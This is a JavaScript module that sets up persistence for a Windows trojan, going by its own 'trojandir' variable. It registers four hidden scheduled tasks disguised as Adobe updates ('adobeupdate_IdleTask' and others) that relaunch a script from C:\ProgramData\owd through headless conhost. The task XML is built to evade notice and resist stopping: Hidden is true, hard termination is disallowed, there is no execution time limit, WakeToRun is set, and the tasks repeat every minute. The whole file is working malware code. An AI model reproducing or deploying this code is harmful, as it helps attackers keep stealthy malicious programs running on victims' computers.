
var taskconfig = {
    tasks: [
        {
            name: "adobeupdate_IdleTask",
            enabled: true,
            taskfunc: getIdleTaskXMLStr,
            tasktime: 1,
        },
        {
            name: "adobeupdate_RepTask",
            enabled: true,
            taskfunc: getRepTaskXMLStr,
            tasktime: 1,
        },
        {
            name: "adobeupdate_TimeTask",
            enabled: true,
            taskfunc: getTimeTaskXMLStr,
            tasktime: 1,
        },
        {
            name: "adobeupdate_DailyTask",
            enabled: true,
            taskfunc: getDailyTaskXMLStr,
            tasktime: 1,
        },
    ],

    getTaskTime(taskname) {
        for (const task of this.tasks) {
            if (task.name == taskname) return task.tasktime;
        }
        return -1;
    },

    getTaskXMLFunc(taskname) {
        for (const task of this.tasks) {
            if (task.name == taskname) {
                return task.taskfunc;
            }
        }
    },

    get tasknames() {
        let arr = [];

        for (const task of this.tasks) {
            arr.push(task.name);
        }

        return arr;
    },
};

async function getTasks() {
    let ret = await getTaskDetail();
    return ret;
}

async function createTask(taskname) {
    logmsg(`starting -- task ${taskname}`);

    if (!taskconfig.tasknames.includes(taskname)) {
        throw new Error(`${taskname} is not supported`);
    }

    let taskxmlstrfunc = taskconfig.getTaskXMLFunc(taskname);
    let tasktime = taskconfig.getTaskTime(taskname);

    let pexe = "conhost.exe";
    let args = `--headless C:\\ProgramData\\owd\\${systemconfig.launch_script_fname} ${taskname}`;
    let workdir = "C:\\ProgramData\\owd\\";

    // let tasktime = ["RepTask", "TimeTask"].includes(taskname) ? "1" : "5";

    let taskxmlstr = taskxmlstrfunc(
        taskname,
        "1999-07-25T12:00:00",
        tasktime,
        pexe,
        args,
        workdir
    );

    let cleanXml = taskxmlstr.replace(/>\s+/g, ">").replace(/\s+</g, "<");

    let fpath = path.join(systemstate.trojandir, taskname + ".xml");
    fs.writeFileSync(fpath, cleanXml, "utf8");
    await exec_schtasks(fpath, taskname);
}

async function exec_schtasks(taskxmlpath, taskname) {
    // schtasks /create /XML "taskxmlpath" /tn "taskname" /F
    let ret = await invoke_exe(
        "schtasks",
        [
            "/create",
            "/XML",
            '"' + taskxmlpath + '"',
            "/tn",
            '"' + taskname + '"',
            "/F",
        ],
        null,
        (text) => {
            logmsg(text);
        },
        (text) => {
            logmsg(text);
        }
    );
}

async function getTaskExists(taskname) {
    let resultdict = null;

    try {
        resultdict = await getTaskDetail(taskname);
    } catch (err) {
        logmsg(
            "task detail returned empty result -- assuming task does not exist"
        );
        return false;
    }

    if (resultdict && resultdict["TaskName"]) {
        return true;
    }

    return false;
}

async function getTaskDetail(taskname) {
    let resultdict = {};
    let taskstr = "";

    // Last Run Time:                        1999-11-30 12:00:00 AM
    // Last Result:                          267011
    // schtasks /query /tn "\Microsoft\Windows\NlaSvc\WiFiTask" /fo LIST /v

    let args = null;

    let showalltasks = isNullOrWhitespace(taskname);
    if (!showalltasks) {
        args = ["/query", "/tn", taskname, "/fo", "LIST", "/v"];
    } else {
        args = ["/query", "/fo", "LIST", "/v"];
    }

    let ret = await invoke_exe("schtasks", args, null, (stdout) => {
        taskstr += stdout;
    });

    if (isNullOrWhitespace(taskstr)) {
        throw new Error("could not generate task detail listing ");
    }

    const lines = taskstr.split(/\r?\n/);

    let results = [];
    for (let i = 0; i < lines.length; i++) {
        let line = lines[i];

        if (isNullOrWhitespace(line)) {
            if (Object.keys(resultdict).length > 0) results.push(resultdict);
            continue;
        }

        let parts = line.split(":");

        if (parts && parts.length > 1) {
            let key = "";
            let value = "";

            if (parts[0] == "Repeat") {
                value = parts.pop().trim();
                key = parts.join(":").trim();
            } else {
                key = parts[0].trim();
                value = parts.splice(1).join(":").trim();
            }

            resultdict[key] = value;
        }
    }

    return results;
}

function getIdleTaskXMLStr(
    intaskname,
    tasktimestr,
    tskxmltime,
    pexe,
    args,
    workdir
) {
    // tasktimestr --> 2005-01-01T00:08:00
    let taskxmlstr = `
        <?xml version="1.0" encoding="UTF-16" ?>
        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
        <RegistrationInfo>
            <Date>2026-04-26T09:45:36.6514157</Date>
            <Author>test</Author>
            <URI>${intaskname}</URI>
        </RegistrationInfo>
        <Triggers>
            <IdleTrigger>
                <StartBoundary>${tasktimestr}</StartBoundary>
            </IdleTrigger>
        </Triggers>
        <Settings>
            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
            <AllowHardTerminate>false</AllowHardTerminate>
            <StartWhenAvailable>true</StartWhenAvailable>
            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
            <IdleSettings>
                <Duration>PT${tskxmltime}M</Duration>
                <WaitTimeout>PT1H</WaitTimeout>
                <StopOnIdleEnd>false</StopOnIdleEnd>
                <RestartOnIdle>false</RestartOnIdle>
            </IdleSettings>
            <AllowStartOnDemand>true</AllowStartOnDemand>
            <Enabled>true</Enabled>
            <Hidden>true</Hidden>
            <RunOnlyIfIdle>false</RunOnlyIfIdle>
            <WakeToRun>true</WakeToRun>
            <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
            <Priority>7</Priority>
        </Settings>
        <Actions Context="Author">
            <Exec>
                <Command>${pexe}</Command>
                <Arguments>${args}</Arguments>
                <WorkingDirectory>${workdir}</WorkingDirectory>
            </Exec>
        </Actions>
        </Task>`;

    return taskxmlstr;
}

function getRepTaskXMLStr(
    intaskname,
    tasktimestr,
    tskxmltime,
    pexe,
    args,
    workdir
) {
    let taskxmlstr = `
        <?xml version="1.0" encoding="UTF-16" ?>
        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
            <RegistrationInfo>
                <Date>2026-04-26T09:45:36.6514157</Date>
                <Author>test</Author>
                <URI>${intaskname}</URI>
            </RegistrationInfo>
            <Triggers>
                <CalendarTrigger>
                    <StartBoundary>${tasktimestr}</StartBoundary>
                    <Repetition>
                        <Interval>PT${tskxmltime}M</Interval>
                        <StopAtDurationEnd>false</StopAtDurationEnd>
                    </Repetition>
                    <ScheduleByDay>
                        <DaysInterval>1</DaysInterval>
                    </ScheduleByDay>
                </CalendarTrigger>
            </Triggers>
            <Settings>
                <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
                <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
                <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
                <AllowHardTerminate>false</AllowHardTerminate>
                <StartWhenAvailable>true</StartWhenAvailable>
                <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
                <IdleSettings>
                    <StopOnIdleEnd>false</StopOnIdleEnd>
                    <RestartOnIdle>false</RestartOnIdle>
                </IdleSettings>
                <AllowStartOnDemand>true</AllowStartOnDemand>
                <Enabled>true</Enabled>
                <Hidden>true</Hidden>
                <RunOnlyIfIdle>false</RunOnlyIfIdle>
                <WakeToRun>true</WakeToRun>
                <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
                <Priority>7</Priority>
            </Settings>
            <Actions Context="Author">
                <Exec>
                    <Command>${pexe}</Command>
                    <Arguments>${args}</Arguments>
                    <WorkingDirectory>${workdir}</WorkingDirectory>
                </Exec>
            </Actions>
        </Task>`;

    return taskxmlstr;
}

function getTimeTaskXMLStr(
    intaskname,
    tasktimestr,
    timetaskxmltime,
    pexe,
    args,
    workdir
) {
    let taskxmlstr = `
        <?xml version="1.0" encoding="UTF-16"?>
        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
        <RegistrationInfo>
            <Date>2026-04-26T09:45:36.6514157</Date>
            <Author>test</Author>
            <URI>${intaskname}</URI>
        </RegistrationInfo>
        <Triggers>
            <TimeTrigger>
                <StartBoundary>${tasktimestr}</StartBoundary>
                <Repetition>
                <Interval>PT${timetaskxmltime}M</Interval>
                </Repetition>
                <RandomDelay>PT30S</RandomDelay>
            </TimeTrigger>
        </Triggers>
        <Settings>
            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
            <AllowHardTerminate>false</AllowHardTerminate>
            <StartWhenAvailable>true</StartWhenAvailable>
            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
            <IdleSettings>
                <StopOnIdleEnd>false</StopOnIdleEnd>
                <RestartOnIdle>false</RestartOnIdle>
            </IdleSettings>
            <AllowStartOnDemand>true</AllowStartOnDemand>
            <Enabled>true</Enabled>
            <Hidden>true</Hidden>
            <RunOnlyIfIdle>false</RunOnlyIfIdle>
            <WakeToRun>true</WakeToRun>
            <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
            <Priority>7</Priority>
        </Settings>
        <Actions Context="Author">
        <Exec>
            <Command>${pexe}</Command>
            <Arguments>${args}</Arguments>
            <WorkingDirectory>${workdir}</WorkingDirectory>
        </Exec>
        </Actions>
        </Task>`;

    return taskxmlstr;
}

function getDailyTaskXMLStr(
    intaskname,
    tasktimestr,
    timetaskxmltime,
    pexe,
    args,
    workdir
) {
    let taskxmlstr = `
        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
        <RegistrationInfo>
            <Date>2026-04-26T09:45:36.6514157</Date>
            <Author>test</Author>
            <URI>${intaskname}</URI>
        </RegistrationInfo>
        <Triggers>
            <CalendarTrigger>
                <StartBoundary>${tasktimestr}</StartBoundary>
                <Enabled>true</Enabled>
                <ScheduleByDay>
                    <DaysInterval>${timetaskxmltime}</DaysInterval>
                </ScheduleByDay>
            </CalendarTrigger>
        </Triggers>
        <Settings>
            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
            <AllowHardTerminate>false</AllowHardTerminate>
            <StartWhenAvailable>true</StartWhenAvailable>
            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
            <IdleSettings>
                <StopOnIdleEnd>false</StopOnIdleEnd>
                <RestartOnIdle>false</RestartOnIdle>
            </IdleSettings>
            <AllowStartOnDemand>true</AllowStartOnDemand>
            <Enabled>true</Enabled>
            <Hidden>true</Hidden>
            <RunOnlyIfIdle>false</RunOnlyIfIdle>
            <WakeToRun>true</WakeToRun>
            <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
            <Priority>7</Priority>
        </Settings>
        <Actions Context="Author">
            <Exec>
                <Command>${pexe}</Command>
                <Arguments>${args}</Arguments>
                <WorkingDirectory>${workdir}</WorkingDirectory>
            </Exec>
        </Actions>
        </Task>`;

    return taskxmlstr;
}

module.exports = {
    getTasks,
    getDailyTaskXMLStr,
    getTimeTaskXMLStr,
    getRepTaskXMLStr,
    getIdleTaskXMLStr,
    getTaskDetail,
    getTaskExists,
    exec_schtasks,
    createTask,
    getTasks
};
